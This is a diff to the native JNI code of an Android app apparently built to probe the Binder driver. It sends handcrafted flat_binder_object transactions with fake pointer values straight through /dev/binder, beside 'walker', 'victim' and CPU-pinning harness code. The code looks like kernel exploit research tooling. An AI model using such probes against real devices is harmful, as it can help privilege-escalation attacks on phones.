@@ -365,16 +365,16 @@ static void* walker_worker(void* opaque) {
     int pin_rc = sched_setaffinity(0, sizeof(set), &set);
     int expected = arg->expected;
     struct {
-        int expected;
         struct flat_binder_object object;
+        int expected;
     } __attribute__((packed)) payload;
     memset(&payload, 0, sizeof(payload));
-    payload.expected = expected;
     payload.object.hdr.type = BINDER_TYPE_BINDER;
     payload.object.flags = FLAT_BINDER_FLAG_ACCEPTS_FDS;
     payload.object.binder = (binder_uintptr_t)(0x4242424200000001ULL + index);
     payload.object.cookie = (binder_uintptr_t)(0x4242424200000002ULL + index);
-    binder_size_t object_offset = (binder_size_t)sizeof(int);
+    payload.expected = expected;
+    binder_size_t object_offset = 0;
     int send_rc = raw_send_obj(fd, handle, 1, 0, &payload, sizeof(payload),
                                &object_offset, sizeof(object_offset));
     int child_rc = wait_for_child(fd, 2);
@@ -434,6 +434,36 @@ Java_org_opencrown_binderprobe_HarnessNative_walkerStart(
 }
 
 
+
+
+static int raw_register(int fd, int32_t manager_handle, int slot) {
+    struct flat_binder_object object;
+    memset(&object, 0, sizeof(object));
+    object.hdr.type = BINDER_TYPE_BINDER;
+    object.flags = FLAT_BINDER_FLAG_ACCEPTS_FDS;
+    object.binder = (binder_uintptr_t)(0x5151515100000001ULL + slot);
+    object.cookie = (binder_uintptr_t)(0x5151515100000002ULL + slot);
+    binder_size_t object_offset = 0;
+    return raw_send_obj(fd, manager_handle, slot == 0 ? 10 : 12, 0,
+                        &object, sizeof(object), &object_offset,
+                        sizeof(object_offset));
+}
+
+extern "C" JNIEXPORT jint JNICALL
+Java_org_opencrown_binderprobe_MainActivity_nativeBrokerProbe(
+        JNIEnv*, jobject, jlong manager_native_data, jint slot) {
+    int32_t manager_handle = handle_of_data(manager_native_data);
+    int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
+    if (fd < 0) {
+        __android_log_print(ANDROID_LOG_ERROR, TAG, "broker open failed: %s", strerror(errno));
+        return -1;
+    }
+    int rc = raw_register(fd, manager_handle, slot);
+    __android_log_print(ANDROID_LOG_INFO, TAG, "broker manager=%d slot=%d rc=%d errno=%d",
+                        manager_handle, slot, rc, errno);
+    close(fd);
+    return rc;
+}
 
 extern "C" JNIEXPORT jint JNICALL
 Java_org_opencrown_binderprobe_HarnessNative_victimExec(
